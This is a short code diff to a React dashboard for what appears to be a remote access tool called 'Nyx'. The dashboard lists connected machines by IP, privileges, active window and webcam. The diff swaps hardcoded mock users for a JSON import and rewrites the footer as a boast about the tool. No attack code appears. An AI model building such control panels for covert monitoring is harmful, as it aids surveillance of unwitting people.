@@ -4,6 +4,8 @@ import Image from 'next/image'
 import { Menu } from 'lucide-react'
 import logo from '@/assets/logo.png'
 import { HereBackgroundGradientAnimation } from "./ui/background-gradient-animation";
+import Data from '@/data/teste.json';
+import { useParams } from 'next/navigation'
 
 interface User {
   id: number;
@@ -31,6 +33,7 @@ interface SubMenuState {
   y: number;
 }
 
+
 export default function Component() {
   const [isOnline, setIsOnline] = useState(false)
   const [isMenuOpen, setIsMenuOpen] = useState(false)
@@ -41,16 +44,9 @@ export default function Component() {
   const [selectedUserId, setSelectedUserId] = useState<number | null>(null)
 
 
-  const users: User[] = [
-    { id: 1, ip: '192.168.1.100', name: 'John Doe', username: 'jdoe', version: '1.2.3', location: 'New York', os: 'Windows 10', privileges: 'Admin', currentWindow: 'Discord', hasWebcam: true },
-    { id: 2, ip: '192.168.1.101', name: 'Jane Smith', username: 'jsmith', version: '1.2.2', location: 'Los Angeles', os: 'macOS', privileges: 'User', currentWindow: 'Valorant', hasWebcam: false },
-    { id: 3, ip: '192.168.1.102', name: 'Bob Johnson', username: 'bjohnson', version: '1.2.3', location: 'Chicago', os: 'Linux', privileges: 'User', currentWindow: 'Chrome', hasWebcam: true },
-    { id: 4, ip: '192.168.1.103', name: 'Alice Brown', username: 'abrown', version: '1.2.1', location: 'Houston', os: 'Windows 11', privileges: 'Admin', currentWindow: 'Spotify', hasWebcam: true },
-    { id: 5, ip: '192.168.1.104', name: 'Charlie Davis', username: 'cdavis', version: '1.2.3', location: 'Miami', os: 'macOS', privileges: 'User', currentWindow: 'Photoshop', hasWebcam: false },
-    { id: 6, ip: '192.168.1.105', name: 'Eva Wilson', username: 'ewilson', version: '1.2.2', location: 'Seattle', os: 'Linux', privileges: 'User', currentWindow: 'Terminal', hasWebcam: true },
-    { id: 7, ip: '192.168.1.106', name: 'Frank Miller', username: 'fmiller', version: '1.2.3', location: 'Boston', os: 'Windows 10', privileges: 'Admin', currentWindow: 'Visual Studio Code', hasWebcam: true },
-    { id: 8, ip: '192.168.1.107', name: 'Grace Lee', username: 'glee', version: '1.2.1', location: 'San Francisco', os: 'macOS', privileges: 'User', currentWindow: 'Zoom', hasWebcam: true },
-  ]
+
+  const users = Data;
+
 
   const userInfo = {
     name: 'Faccin',
@@ -230,7 +226,8 @@ export default function Component() {
 
       <footer className="p-4 flex justify-between text-blue-300 text-xs sm:text-sm relative z-10">
         <span>Status: Nyx - Connected - {users.length}</span>
-        <span>Listening on port 4782</span>
+        <span>The most powerfull remote acess tool created.</span>
+        <span>Made by FaccinDev.</span>
       </footer>
     </div>
 
